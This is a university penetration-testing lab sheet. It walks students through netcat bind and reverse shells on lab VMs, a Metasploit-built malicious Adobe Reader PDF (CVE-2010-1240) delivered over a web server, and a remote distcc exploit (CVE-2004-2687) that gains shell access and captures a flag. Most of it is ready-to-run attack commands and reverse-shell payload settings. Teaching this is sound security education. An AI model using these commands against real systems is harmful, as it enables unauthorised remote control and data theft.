---
title: "Vulnerabilities, Exploits, and Remote Access Payloads"
author: ["Z. Cliffe Schreuders"]
license: "CC BY-SA 4.0"
overview: |
  In this lab you will explore one of the major threats in computer security: software vulnerabilities. It's a critical topic in the field of cybersecurity, as understanding how attackers exploit weaknesses in software systems is essential for both defensive and offensive security measures. The lab will cover various aspects, starting with an introduction to software vulnerabilities and the causes behind them, moving on to explore different types of payloads, such as bind shells and reverse shells. You will also get hands-on experience with the Metasploit framework, a powerful tool for conducting security assessments and penetration testing.

  Throughout this lab, you will gain a deeper understanding of software vulnerabilities, how exploits work, and the techniques attackers use to gain remote access to vulnerable systems. You will learn and apply both remote and local (client-side) exploits. You'll simulate creating and using a malicious PDF document to compromise a system, as well as remotely exploiting a system with known vulnerabilities. This hands-on experience will provide you with valuable insights into the world of cybersecurity and start to learn about the power of the Metasploit framework, a popular hacking and penetration testing tool.
description: |
  Learn about software vulnerabilities, exploits, and payloads including bind shells, reverse shells, and Metasploit framework usage for penetration testing. This lab covers practical exploitation techniques using real-world examples like Adobe Reader vulnerabilities and Distcc remote code execution.
tags: ["vulnerabilities", "exploits", "payloads", "metasploit", "bind-shell", "reverse-shell", "penetration-testing"]
categories: ["introducing_attacks"]
lab_sheet_url: "https://docs.google.com/document/d/11I8xMUXrT5ArJIsAhwGDtQ4RkH4l9CR4C2wh9_wz8xM/edit?usp=sharing"
type: ["ctf-lab", "lab-sheet"]
lecture_url: "http://z.cliffe.schreuders.org/presentations/slides/DSL_DS_OSPT_Lectures_3_Vulnerabilities.html"
reading: "Chapter 8: Using Metasploit. Harper, A. and Harris, S. and Ness, J. and Eagle, C. and Lenkey, G, and Williams, T. (2011), Gray hat hacking : the ethical hacker's handbook, McGraw-Hill. (ISBN: 978-0-07-174256-6) Available online via the library"
cybok:
  - ka: "MAT"
    topic: "Attacks and exploitation"
    keywords: ["EXPLOITATION", "EXPLOITATION FRAMEWORKS"]
  - ka: "SOIM"
    topic: "PENETRATION TESTING"
    keywords: ["PENETRATION TESTING - SOFTWARE TOOLS", "PENETRATION TESTING - ACTIVE PENETRATION"]
---

## General notes about the labs {#general-notes-about-the-labs}

Often the lab instructions are intentionally open ended, and you will have to figure some things out for yourselves. This module is designed to be challenging, as well as fun\!

However, we aim to provide a well planned and fluent experience. If you notice any mistakes in the lab instructions or you feel some important information is missing, please let me (Cliffe) know and I will try to address any issues.

## Preparation {#preparation}

==action: For all of the labs in this module, start by logging into Hacktivity.==

[**Click here for a guide to using Hacktivity.**](https://docs.google.com/document/d/17d5nUx2OtnvkgBcCQcNZhZ8TJBO94GMKF4CHBy1VPjg/edit?usp=sharing) This includes some important information about how to use the lab environment and how to troubleshoot during lab exercises. If you haven't already, have a read through.

==action: Make sure you are signed up to the module, claim a set of VMs for this lab, and start your VMs.==

Feel free to read ahead while the VMs are starting.

==VM: Interact with the Kali VM==. (Click ![][image2] after the VMs have started). ==action: Login with username "kali", password "kali".==

==VM: Interact with the Windows Victim VM==. ==action: Login with password "tiaspbiqe2r"== (**t**his **i**s **a** **s**ecure **p**assword **b**ut **i**s **q**uite **e**asy **2** **r**emember) to the account that is NOT called "vagrant".

==VM: On the Windows Victim VM (the victim)==, ==action: open a command prompt by clicking "Start" → "Run", and enter "cmd"==. ==action: Check the IP address of the Windows VM, by running ipconfig==. If the IP address does not start with "10.", then restart the VM from within Windows.

Leave the Linux victim VM running; you'll connect to it later.

Note that these systems have been configured to be insecure. The Windows system has installed Adobe Reader \< 8.1.2 and Netcat (a version with the \-e flag, not all versions support this). Which was obtained here:   
[http://eternallybored.org/misc/netcat/](http://eternallybored.org/misc/netcat/)

## Introduction to software vulnerabilities {#introduction-to-software-vulnerabilities}

Often an attacker’s aim is to get malicious code running on a victim system. One way to achieve this is to trick a user into running some malware. But what if only “trusted” software is running that was obtained from legitimate vendors, and only developed by software authors that have the best of intentions? What if an administrator has locked down the targeted system so that only software from big name development companies, such as Microsoft and Adobe, is allowed to run? Unfortunately, the answer is that most software can’t be trusted to always behave.

It turns out that it is quite hard to write secure code, and innocent and seemingly small programming mistakes can cause serious software vulnerabilities.

A *software vulnerability* is a weakness in the security of a program. In many cases software vulnerabilities can lead to attackers being able to take control of the vulnerable software. When an attacker can run any code they like as a result, this is known as “*arbitrary code execution*”. In which case, attackers can essentially assume the identity of the vulnerable software, and misbehave[^1].

## Causes of software vulnerabilities {#causes-of-software-vulnerabilities}

There are various causes of software vulnerabilities. The main categories include:

* Design flaws (mistakes in design)

* Implementation flaws (mistakes in programming code)

* Misconfiguration (mistakes in settings and configuration)

## Exploits and payloads {#exploits-and-payloads}

An *exploit* is an action — or a piece of software that performs an action — that takes advantage of a vulnerability. The result is that an attacker makes the system perform in ways that are not intentionally authorised. This could include arbitrary code execution, changes to databases, or denial of service (for example, crashing the system). The action that takes place when an exploit is successful is known as the *payload*. 

## Types of payloads: shellcode {#types-of-payloads:-shellcode}

In the Malware lab you saw that Metasploit has lots of payloads, and these can be listed. ==action: Run:==

```bash
msfvenom -l payload | less
```

> Note: Note, we are piping the output through to less, so that we can easily scroll through the output.

> Tip: Press “q” to quit the less program

Often a payload is “*shellcode*”. That is, it gives the attacker shell access to the target system, meaning they can interact with a command prompt, and run commands on the target’s system.

There are two main ways to achieve this: bind shells, and reverse shells. 

### Bind shell {#bind-shell}

The simplest kind of remote shell access is via a **bind shell**. A bind shell listens on the network for a connection (typically over TCP, but it doesn’t have to be), and serves up a shell (command prompt) to anything that connects.

To get an understanding of the concept, you will simulate this using Netcat. Remember, Netcat is a general purpose network tool, and can be used to act as a client, or as you are about to experience, it can also act as a server, listening for connections.

==VM: On the Windows Victim VM (the victim)==, ==action: open a command prompt by clicking "Start" → "Run", and enter "cmd".==

==hint: Note the IP address of the Windows system.== (Hint: "ipconfig")

==action: To see a description of how to invoke Netcat, run:==

```bash
nc.exe -h
```

==action: Start a Netcat listener that will feed all interaction to a command prompt:==

```bash
nc.exe -l -p 31337 -e cmd.exe -vv
```

> Note: If prompted by Windows firewall, allow the connection by selecting all networks and click "Allow access".

![][image3]

Based on the output from the previous command, figure out the meaning of each of the arguments to this above command. For example, “-l” tells Netcat to listen as a service, rather than connect as a client to an existing service.

Note: obviously, in real attacks you won't be setting this up manually on the victim’s system, you use an exploit to get the payload onto their system. We will get to that soon.

==VM: On the Kali Linux VM (the attacker)==, ==action: open a terminal by clicking the console icon.==

==action: Connect to the bind shell that is running on port 31337 of your victim's system:==

```bash
nc *IP-address-noted-earlier* 31337
```

> Note: If prompted on the target system by Windows firewall, allow the connection. Once you close this connection the Netcat running on the victim will also close, if you want to try again, you also need to repeat the previous command.

The attacker now has shell access to the victim's system. ==action: Type a few commands (for example: "dir", and "net user"), to confirm you have remote control over the system.==

Before moving on, let’s demonstrate something simple that can be done with this kind of access: 

==VM: On the Kali Linux VM (the attacker)==, you should see the Windows command prompt within your terminal, showing where you are within the victim's system. ==action: Navigate to the Desktop (hint: "cd Desktop") and enter the following to create a file:==

```bash
echo Good thing this isn't malware! > not_malware.txt
```

==VM: On the Windows Victim VM (the victim)==, ==action: check the desktop==. You should see a new file (with a name that is a little suspicious…). ==action: Open this file to see the message we created from Kali==. Although this is a benign file, we could have created something far worse, such as malware that would trigger when the victim opens it.

The important thing to note is that with a bind shell the target listens to a port, and the attacker then connects through to the shell. This is illustrated below.

Bind shell: attacker connects to port on victim

The main limitation with this approach, is that nowadays Firewalls and NAT routing often prevents any *incoming* network connections that are not already established, unless there is a reason to allow incoming connections on certain ports: for example, if the system is a server it needs to be allowed to accept connections to some ports. Score one for the good guys...

Bind shell: main limitation, NAT/firewalls rules typically prevent this

When you are finished simulating a bind shell, run:

exit

### Reverse shell {#reverse-shell}

A solution for an attacker is to rethink the way the connection is established; and rather than connect from the attacker to the victim, get the victim to initiate the connection to the attacker. This is known as a *reverse shell*, and is now the most common approach to shell payloads.

Reverse shell: connection from the victim to the attacker

Again, you will simulate this using Netcat:

==VM: On the Kali Linux VM (the attacker)==:

==hint: Note the attackers IP address for the host only network== (hint: "ifconfig", the IP address will start the same as the Windows VM IP address you noted earlier).

==action: Start a listener:==

```bash
nc -l -p 53 -vv
```

==VM: On the Windows VM (the victim)==:

==action: Connect back to the attacker and present them with their shell:==

```bash
nc.exe *Attacker-IP-address-noted-above* 53 -e cmd.exe -vv
```

Once again you have a shell. Note that this time the Windows firewall does not offer to block the connection, since the connection was outgoing.

So why, of all 65535 possible TCP/IP ports, would an attacker choose port 53? It is possible to set firewall rules to restrict even outgoing connections. However, most Internet connected systems need to be able to use DNS, which resolves domain names, such as “google.com” into IP addresses. It just so happens that DNS uses port 53 (both UDP and TCP). So by choosing 53, it is *extremely* likely that firewall rules will let this through.

Before finishing, let’s try a few more simple commands to simulate malicious activity on the victim’s system. 

==VM: On the Kali Linux VM (the attacker)==, you should see the Windows command prompt within your terminal. ==action: Enter the following command (all on one line), and watch the victim's screen:==

```bash
explorer "https://google.com/search?q=how+to+avoid+paying+taxes"
```

Uh Oh - it seems that the victim has just opened a browser and searched for a way to avoid paying taxes! That could come back to haunt them! (Note: Even if they don't have internet access, check the search bar to see what would have been returned). Perhaps spend a few minutes seeing what other things can be triggered via simple commands. For instance, can you find ways of doing the following things?

* ==action: Open an application on the victim's computer==  
* ==action: Delete a file from the victim's computer (do not delete any important files!)==  
* ==action: Remotely shut the victim's computer down (save any open work beforehand)==

When you are finished simulating a reverse shell, run:

exit

### A note on NAT {#a-note-on-nat}

Briefly, a similar complication is the fact that often computer systems share the one public IP address of the router they are behind, which then sends that traffic through to the correct local IP address. This is known as Network Address Translation (NAT). Consequently, unless port forwarding is configured on the router, there is no way to connect directly to a system without a public IP address. Again, reverse shells become a necessity, since they can start connections to other systems. Also, in order for the victim to connect back to the attacker, the attacker requires a public IP address (or port forwarding from a public IP address).

## Exploits and the Metasploit framework (MSF) {#exploits-and-the-metasploit-framework-msf}

Remember, an attacker is not going to ask someone to start a Netcat server, to give them access to the system\! They use exploits to take advantage of vulnerabilities, and take control by force.

Metasploit’s primary focus, as the sound of the name suggests, is on exploits, and exploiting vulnerable systems. Since its inception, the Metasploit framework has evolved to include other types of security tasks; however, exploits are at the heart of MSF, and MSF is one of the most complete tools for exploitation. 

The framework itself provides a set of libraries and tools for exploit development and deployment, and includes modules which add support for specific exploits, payloads, encoders, post-exploitation tools, and other extensions. As illustrated in the figure below, sitting above the framework are a number of different interfaces that can be used to interact with the framework and make use of the modules. Each interface has its uses, and like many software tools, you should learn about the available options so that you can use the right tool for each job.

Metasploit interfaces and modules

The most popular interfaces for MSF are:

* msfconsole: interactive text-based console, with access to all MSF features

* Metasploit Community & Metasploit Pro: Web interface and additional non-free tools

* Armitage: graphical user interface (gui)

A number of other security tools also make use of the MSF, and provide an interface to some of its features.

In order to make use of an MSF exploit, these steps need to occur:

* Specify the exploit to use

* Set options for the exploit (such as the IP address of the computer to attack)

* Choose a payload (this defines what we end up doing on the compromised system)

* Optionally choose encoding to evade security monitoring such as anti-malware, intrusion detection systems (IDS), and so on

* Launch the exploit

The fact that you can combine exploits, payloads, and encoding methods provides a lot of flexibility that is unavailable using most other methods of exploitation.

## MSFCONSOLE: the interactive console interface {#msfconsole:-the-interactive-console-interface}

==VM: On the Kali Linux VM (the attacker)==, ==action: open a terminal by clicking the console icon.==

The msfconsole interface provides an interactive console, which many consider the preferred interface for Metasploit. It provides all the features of the MSF.

==action: Start the Metasploit console (this will take a moment):==

```bash
msfconsole
```

When starting, Metasploit console reports the number of exploit modules it includes. Depending on the version, and when it was last updated, MSF will include over two thousand different exploits that can be used to compromise vulnerable systems!

==action: To see a list of the commands that msfconsole supports run:==

```bash
msf > help
```

==action: To view a list of Metasploit's modules:==

```bash
msf > show all
```

And ==action: to narrow that down to just the exploits (this will also take a second):==

```bash
msf > show exploits
```

==action: Run a msfconsole command to list the available payloads.== Hint: similar to the above.

Note that in addition to Metasploit commands, you can also run local programs, similar to the standard local shell. ==action: From within msfconsole run:==

```bash
msf > ls /home/kali
```

## Exploits in local programs {#exploits-in-local-programs}

Many old versions of Adobe Reader contain programming errors that make them vulnerable to attack. It is possible to craft a PDF document that exploits a vulnerability to take control of the program.

The exploit we will use is against the "Adobe PDF Escape EXE Social Engineering" also known as CVE-2010-1240 (try searching for this CVE and see what information there is). The corresponding Metasploit module is "exploit/windows/fileformat/adobe_pdf_embedded_exe".

When Adobe Reader opens the malicious PDF file, the user is prompted to execute a payload, with a message that tells the user to click Open, which results in the payload being executed.

==action: Run:==

```bash
msf > info exploit/windows/fileformat/adobe_pdf_embedded_exe
```

The output will include information about this exploit.

The "use" command is used to instruct msfconsole to set an exploit module for use:

==action: Run:==

```bash
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
```

If you select a module and then change your mind, you can run "back" to return to not using the exploit:

```bash
msf exploit(adobe_pdf_embedded_exe) > back
```

But we do want to use that one, so once again:

==action: Run:==

```bash
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
```

> Tip: Note that you can use TAB autocomplete, so before you finish typing the above, try pressing the TAB key. You can also use the UP and DOWN cursor keys to return to previous commands.

==action: To see the options that we need to set in order to exploit the vulnerability, run:==

```bash
msf exploit(adobe_pdf_embedded_exe) > show options
```

If you look within the "Module Options" section, you will see four things that can be set, including the name of the malicious file. ==action: Set the filename with the following command:==

```bash
msf exploit(adobe_pdf_embedded_exe) > set FILENAME *timetable*.pdf
```

You can use something other than "timetable", if you choose.

The next step is to configure the payload to use. ==action: To list compatible payloads:==

```bash
msf exploit(adobe_pdf_embedded_exe) > show payloads
```

So ==action: to use a reverse shell:==

```bash
msf exploit(adobe_pdf_embedded_exe) > set PAYLOAD windows/shell/reverse_tcp
```

Again, ==action: check the options that need to be set:==

```bash
msf exploit(adobe_pdf_embedded_exe) > show options
```

This time there are two options we need to set: LHOST and LPORT. These are the details of the attackers local system. For the reverse shell to work, it needs to know what IP address and port to connect back to. 

==hint: Note the Host-only IP address of your Kali Linux VM== (hint: "ifconfig", note the address starting with 10), and choose a TCP port to use. 

==action: Set the LHOST:==

```bash
msf exploit(adobe_pdf_embedded_exe) > set LHOST *Your-Kali-IP-Address*
```

==action: Set the LPORT:==

```bash
msf exploit(adobe_pdf_embedded_exe) > set LPORT *Your-Choice-of-Port*
```

==action: Run the exploit:==

```bash
msf exploit(adobe_pdf_embedded_exe) > run
```

This has created a malicious PDF document, which when viewed with a vulnerable reader will spawn a reverse shell. Check the output to see where the PDF file has been stored.

In order to receive the reverse shell, the attacker needs to start listening for connections, before sending the PDF to a victim.

==action: Set up the handler:==

```bash
msf > use exploit/multi/handler
```

```bash
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
```

```bash
msf exploit(handler) > set LHOST *Your-Kali-IP-Address*
```

```bash
msf exploit(handler) > set LPORT *Your-Choice-of-Port*
```

```bash
msf exploit(handler) > run
```

> Note: *Your-Choice-of-Port* must be the same as when you created a payload above, i.e. crafted pdf *timetable*.pdf

Leave the above running, it is waiting for our victim to connect.

==action: Open a new terminal tab (Shift-Ctrl-T).==

==action: Transfer the pdf file to the Windows VM, by starting a Web server to share your PDF document:==

==action: Start by creating a directory to place our files:==

```bash
sudo mkdir /var/www/html/share
```

==action: Copy your new PDF to this location== (if the PDF was originally created in another location, replace the first path with that one instead):

```bash
sudo cp /home/kali/.msf4/local/*timetable*.pdf /var/www/html/share/
```

==action: Start the Apache Web server:==

```bash
sudo service apache2 start
```

==VM: On the Windows VM (the victim)==, ==action: browse to the Web server hosting the PDF.==

==action: Open a Web browser, and in the location bar, enter the IP address of your Kali Linux system followed by "/share" and the name of your PDF file.==

For example: "10.x.x.x/share/timetable.pdf".

==action: Download and open the PDF document using Adobe Reader==[^2].

==VM: On the Kali Linux VM (the attacker)==, ==action: switch to the terminal tab that is running the reverse shell listener==. If the attack was successful, you will now have shell access to the victim system! Just by opening a PDF document, the victim has handed over control of their system to an attacker!

==action: Type a few commands (for example: "dir")==

Related reading:

About the vulnerability:

[https://nvd.nist.gov/vuln/detail/CVE-2010-1240\#vulnCurrentDescriptionTitle](https://nvd.nist.gov/vuln/detail/CVE-2010-1240#vulnCurrentDescriptionTitle)

Source code for the exploit:

[https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/adobe\_pdf\_embedded\_exe.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/adobe_pdf_embedded_exe.rb)

Self-study question: What countermeasures can be used to prevent this kind of attack? Discuss with your tutor, if you are not sure.

## Exploits in remote services {#exploits-in-remote-services}

In the previous attack, you attacked a local program (Adobe Reader) that had no direct access to the Internet. This type of attack often involves some *social engineering* (that is, tricking a user into doing something we want), to get someone to access our exploit (in this case, to load the malicious PDF document, and click a button).

However, many vulnerabilities are directly exposed to the Internet, which can be exploited without having to interact with human beings at all\! A system administrator’s worst nightmare...

==action: Make sure the Linux Victim VM is running.== You should see this on Hacktivity:

![][image4]

You will not be able to open this VM directly, and that is expected.

==hint: Make a note of the server's IP address.==

You can determine the IP address of the Victim VM by starting with the same 3 octets of the IP address as your Kali and Windows VMs, but ending in ".3". 

This server is vulnerable because it contains Distcc, software that has security weaknesses known as **CVE-2004-2687**. Distcc is a program to distribute compilation of C/C++ code across systems on a network. Distcc has a [documented security issue](https://distcc.github.io/security.html), where anyone who can connect to the port can execute arbitrary commands as the distcc user. Take a look at the information contained within the links - does this seem similar to previous vulnerabilities we've examined? If not, what's different?

The Metasploit exploit is known as exploit/unix/misc/distcc_exec

Continuing on the Kali Linux VM , in msfconsole (type "exit" if you are still in the meterpreter shell from earlier):

==action: Run:==

```bash
msf > info exploit/unix/misc/distcc_exec
```

The output will include information about this exploit.

The "use" command is used to instruct msfconsole to set an exploit module for use:

==action: Run:==

```bash
msf > use exploit/unix/misc/distcc_exec
```

==action: To see the options that we need to set in order to exploit the vulnerability, run:==

```bash
msf exploit(distcc_exec) > show options
```

We need to specify the remote host's IP address.

Configuration options are set using the "set" command. So ==action: to tell msfconsole what our target is:==

```bash
msf exploit(distcc_exec) > set RHOST *VICTIM-SERVER-IP-Address*
```

(One line, where the IP address is the one you noted earlier).

It is safe to leave the port as is, since this is the port our target is using.

As you will remember, the next step is to configure the payload to use. ==action: To list compatible payloads:==

```bash
msf exploit(distcc_exec) > show payloads
```

So ==action: to use a reverse shell:==

```bash
msf exploit(distcc_exec) > set PAYLOAD cmd/unix/reverse
```

Again, ==action: check the options that need to be set:==

```bash
msf exploit(distcc_exec) > show options
```

For the reverse shell to work, it needs to know what IP address and port to connect back to.

==action: Set the LHOST:==

```bash
msf exploit(distcc_exec) > set LHOST *Your-Kali-Host-Only-IP-Address*
```

==action: Set the LPORT:==

```bash
msf exploit(distcc_exec) > set LPORT *Your-Choice-of-Port*
```

Many exploits do not support it, but some can be checked to see if the target is vulnerable, without actually running the payload:

==action: Run:==

```bash
msf exploit(distcc_exec) > check
```

In this case, the exploit does not support checking if it will work, but it doesn't hurt to try.

And ==action: to launch the attack:==

```bash
msf exploit(distcc_exec) > exploit
```

Note that using msfconsole, launching the exploit will also start the reverse shell handler, so we don’t have to manually start the listener beforehand.

Although you are not greeted by the familiar Linux prompt, you can start running commands. ==action: Check that you have access to the system:==

```bash
whoami
```

```bash
uname -a
```

You have user level access to the system! 

In this case we have access to what this user can access on this system. Note that on Unix systems "root" is the superuser (admin) account, and gaining root access is often the aim in an attack against Unix, since you then have the authority to do practically anything on the target system. However, there is often plenty of damage a normal user can cause, including accessing any files that the user is authorised to access.

==action: You can "upgrade" to an interactive shell prompt by running:==

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

==action: Run:==

```bash
ls /home
```

**Find the flag**

==action: There is a flag in the distccd user's home directory. Find and read the flag, and then submit the flag to Hacktivity.==

When you are done, press:

```bash
Ctrl-C
```

```bash
msf exploit(distcc_exec) > exit
```

Related reading, to understand how the exploit works:

[https://nvd.nist.gov/vuln/detail/CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)

The Metasploit exploit: [https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc\_exec.rb](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc_exec.rb)

Self-study question: What countermeasures can be used to prevent this kind of attack? Discuss with your tutor, if you are not sure.

## The need to know as much as possible {#the-need-to-know-as-much-as-possible}

This lab provided you with information about some attacks that can be used against the victim systems. In order for these attacks to be successful against a target, we needed to know about the software that they were running, the vulnerabilities that they had, and the exploits that could be used to compromise them. In many ways discovering this information is the most important challenge that attackers face, and in order to test the security of computer systems we need to start by learning everything we can about them. This is the focus of the next few labs.

## Conclusion {#conclusion}

At this point you have:

* Learned about various kinds of software vulnerabilities, exploits and their impact

* Learned about payloads, bind shells, and the reason attackers use reverse shells to circumvent firewalls

* Used Netcat to simulate shell payloads

* Used the Metasploit console interface (msfconsole) to create a malicious PDF document, and used it to take remote control over a vulnerable system

* Used Metasploit to remotely exploit a vulnerable system, gaining access

* Explored some of the ways that shell access can be used within a system

* Learned the importance of information gathering, since that information is needed to conduct any of these attacks

Well done\!

## Footnotes

[^1]:  Arbitrary code execution is not just something that affects desktop operating systems. Resourceful gamers have shown that certain titles, such as Castlevania: Symphony of the Night or The Legend of Zelda: Ocarina of Time have ways of organising your character’s inventory or giving save files specific names so the system reads them as code, essentially hacking the games in real-time and giving players advantages that were never intended by the developers.

[^2]:  Remember we are exploiting a vulnerability of the Adobe Reader application, so use Adobe Reader and not Chrome to open the PDF file.

[image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADkAAAAUCAYAAAA3KpVtAAAD1UlEQVR4Xt1XS0tbQRTOumBw76KBLkwKgrvSjQr2B6Q/wOJPEFoKgqVWYkEoSLBYu6gpdFcfMQ+TmMTcaGIT8zAPa7cRXNid+AtO73eSuU4muTERocEDh7lz5nyT+eacOTOxEJHVYrHQQ1VdLBAKx0MU1fYomdYolTmk42KWTipFKp+WqHpWpdM/VW4rvytsz5fy9Ct3xL77h3HG70aD5AvvkHd3m7YCm7Tp36AN38//rg2yFiaIxaazKcrkM0zEteiiyReTTbsyYB0g10eXTrasE81RtpChg6Mk40HUH/HRTshL24EtJqr+4OzcLDkcDmM+fKs+nVTGQjGf6qOqQRIRBMFCucAExCSDg4M0Pz9PmqZxOz09bYw5XzopnUlx1JNHGsUPYhSK7VIg4udogqiIpufHOlmtVnI6nVSr1ZBCLPjGXBhTFycrxuEnYyGYD/aVtZUWTAtJpB0iCIJYPGwgdXV11TQpxOPxMHn42B123hjgtVSCIvthTluOZvCGJPzgL0T+xnzoq4tTF4oNhlxcXFA2k+FW4DG/imkhmS3Uz2DD0JacKqOjo+zr/uzmaCITYsloPW3DPo4mSELhp0ZBFoyZpS7sAvvksY3Gnz2nt6/f8Ld7eZntmN8Mb5AsNs4gvhHBbkVEARuE85k43OfziZT1hXaMAjQzM9OEE5up2tQFikVCrq+vmZjdbuc+Ion+38tLnr8TnkmW9CqKIoM0FFFEvk9MTBikcS6FbbmxgxDgUYVzxWPS0gmOZnAvwJX2PklCRkZGeB0QQfK8dt4dyepZhTti8UhFm83GaYJWRAx2r9fLNiF1fJUK+rWCSosChHOJlBUk4SOnq0qwl3SFuj4s0NPhYVpb/cJ2zGeGN0jiHkQrdgnfatq2swk78ChAnUgiC2SMLBgzuw5gF1iQE0ShSGEI5jPDGyTNIonURQtyGIe9VCr1HMm+uEJwdeCiF2UaKdkYZJXvR6FCBD5/kuP7MpaMUTDafCbxYyAqzyeqM8p/p0UKrLiGgMMZlPGqf1uSqK7uFTcb5KJym7SrrnuJenXFXdkPzzuDJJ5o4qWDCtuNIJXhOzQ0ZLxl4wdxnWTEeN71Fcm593OcblOvpoyU6CTiLEFxfSwsLhj9PtWbDipkuYe3K6K/+nVVndBUhag21c9MZXwvOIvceadHFFVy/fs31alJkaKIYKGcbxnrVntcZJP/HYi2GMjr93IxwksI10v9/2SFIyf+T46Nj7XgetUeFtmEuReS0KVPSxRPxjmyiBhanFvY70pQXqDoqz5mKmPV9lbV/R61GB+QYh/+AcxGR7g4odpQAAAAAElFTkSuQmCC>

[image2]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAjCAIAAABzZz93AAADfElEQVR4Xr2Ve0/TUBiH+yU3NjBuA4fcpuOixACJGHE6VGAYiSAmXmJCZIgMuYQoExGH8w5TQVi79bqWXbryAWx7BjvnrBYGypvnn57ze9+np21SIpdVdHZPACKb3T0xiGxm9+iIdHdnV0dHpwmjkxFKKuSPJ5NYl91iXjZ32+TSJsgTmfTusaA3Z4av4ga4qurvhKIg/FeZyEuzwbHALX9Pz/VSbgyNr5ESSO4wpLvSijv2C5aldxSYteWFoZ4LeANaNuc5MoV0xT+E8NB+VdUPhqIghsheP7iCR0vq/tw3VkRMAhWprMBjxYJlO5ICkFIZ9ymTJq1sjsYkX8gDeCrS11iJ5+Cqqg9MRUG4IBM5YW70oGPZ638xiGn7e9jsTKBgmSQqKhtzA2ewjLuV4WSwa0BK5sgI2vGX0mWgqyCb9p+FA3and2R+HRdAbH0LD7QjLVhVVOx9n4gspd6m0mVDor5xEawbwsVNvwiL1dnSKySTC496tStV9iIKGgkxpah40PjNF9qiIWw8ctv0i3B6uqdXKC2cpKrVm9JloJcQBUUFeyI3J7XFUshY1PRMFu1McAu11VR3fvjlV3BJpAQlZSQD6xjRVyNoEC6reia+pAWmPBmzuemwGx9NNY2/2S5tgSFSvKKCy55ri4awZCIUaEPjFldbn4DG6E8z3e0dWC8h8LLA53HZRF7gzHjaf9lZeHvW6mYfB+8y0lp4SttxebEuXcbJ5cqon7Gx/i41WX2hf341CW+th6euNtcay3hO5ktkvRN5njsK25Hp4hSXF9sleDbHsyWyYJ5nyyUXW521wf81VYZm1JP9K1l6ZW4QmWIo4xhZf8bFUmUcUy7pd7MBZIrLi2X+o8xa04JlCIaVGUZuhFMWiz+YZ+lySS+jsqq6S1hGl9FyH2pr6JmK4bMOgCGl0J1L0AxrbesAlinIgtfcUM5id3hGZzZKJ5pArk5cdMA/Kluz7xmWIdhknknmt9bf+5pOQVGtauo8Ho/3MDTU1mC9dlfn5Mcsow/fh2ASMq1CybG3i1jDcWphO0cn8hh7Mu1CrEOew9HLfvo85ADzNfZlOr+p5mqzv/Bh6u7Yxx8bGdjB7EHQVC6pIQO+Li36LzbgAw5d7va78Xhxmk6O3gOXARLxTOzz9yejjwcH7gUOwYOHwcgXgUSHGMsSpIr83yjK/gBwmQ+jyG79IQAAAABJRU5ErkJggg==>

[image3]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdYAAAFQCAIAAACNkcjIAABTM0lEQVR4Xu2dB3xVRd738z7Ps4Du7qtrxbKWV8QGKij7aFRY6U2wIb0ZuPQQCF0QBAQMJaGEHkDpvUmWQGiKUgSRXpIAUhMg9ARQ4LzTz5xyk5tww035/fh/LnPm/GfmP3POfDN3bgsKknoTgiAIymE9+eSTRYsWTTydzs3kb1xc3PHjxw0IgiAox3Tz5s2ElHMPPfJIUso1YoK/kZGR47//DQaDwWB3webuO0oofOLCn2L9O2HFThgMBoPdNVuUcrVo0aIUwcePH58YuwsGg8Fgd83mpaQ9+eSTFMHXrl2b9J/dMBgMBrtrNuv0VYJfimDDMGJW7oHBYDDYXbNvT2kInhK3BwaDwWB3zSaf1BA8ddU+GAwGg901G3cizUTwt6v3+2Ix/9kzcObGVt2mdRj3w+B5250OMBgMltdt2qz4xu99UOGh/+cXI7U5myA26pi2Cv4u/kDGNnTe9qKzyg1IHrQnffena8/XnnepYczBSuGzQ8ZOdDrDYDBY3jXCzSs7t6bMnewXI7U5myA2/HcNwTPWHszApsbt/duYyk+lFjtkzCPOniNG9UWGZ+X6fqmfV+xTd8C8OGcRGAwGy6NGoHn5182nZ01Ins1sFjV+eJon+CmeEDaR5U8082WC1OZsgtjgoxqCZ647lIH1mrr6//R6p+i8etEHp+4+mlojySg31Wj5/fzBxuuV1/27xbhJyrNbzaDyQ0S6fFCpxjNkJUPqBtWc/Lye49Umk4KOzKwbaVGorv1UlmzGF76FbRoZBNJZeUi7k6XiMBgssEagefGXjae+izZtukiM69X7k8883GyHJG0pwuzkd9GkNmcTxAYc1hA8e31iBvavDqP/UX160U7r3x625+Pl1/73h5vBA41Ppk/79I9CxTY8XCysken8Tb2gmjE8XTwoqHj7NTwd2b60SmdmMRWCSjsys2gzexcPqtddpu1ns2k0sCYznflWI02/Uq/CK8oz81KZOsBgsLtpBJoXNm84MSXqRAy14zJBjKBWfdvD2O499UOSPi7dqE1hFhNFanM2QaxPkobgORuSXG13z8bLP3kvotr/6gnyuKxF7RI9pz++sPR9/aq/5hlpFpnVp3iJPiNZumKHPsU/iGH5a5uWKN10lr1yLxZTMai0IzOLFlE/SIbhP6OBZdqLkR1KF++wlj/6WCpTBxgMdjeNQDN145pj44f+PoHZ+GHskaaju3YnqL3FpBI8TU4Rh2O8CLVhPE1qczZBrGeihuC5Pya52vb2n6yo+VrXf5XUE+RxdqMaLzb87ZUvlz/bcG63kT9rRRht57DEHEKf+j1ppkhQ1tBTjEqh9fk2gSg4p09xdlg8tA85q+cQVRya1LMWfWTOrDitJ6l4rRjWoukmwyA+pKq1ZmBmbTykJGspWqe1cpqoWKt0T5FDKxSq1cdsaChjvWpFdX8O/VNki5ZkagGI+lWtQbQvqh4YDBYw4wg+Ej34yJjB5PFotPY4ZvCYLl0JcP/QRA5JJvfnbsqIP6nN2QSx8IQrJoLnbzziagM+qflVqWdblCqhEv3r1GxRusSw+rVKh/9S6Zv01xpv/G7VIb1Ir1pBlYaRxNTRNF262Zwj84fVD6o1lZyqFMQON06tRIlDc8ipXrQUzWGljowOJVQqrefMn/NlcZIjKyGJ4iVKFw9dT9L0UeXbbX0zBlkejGyaFadl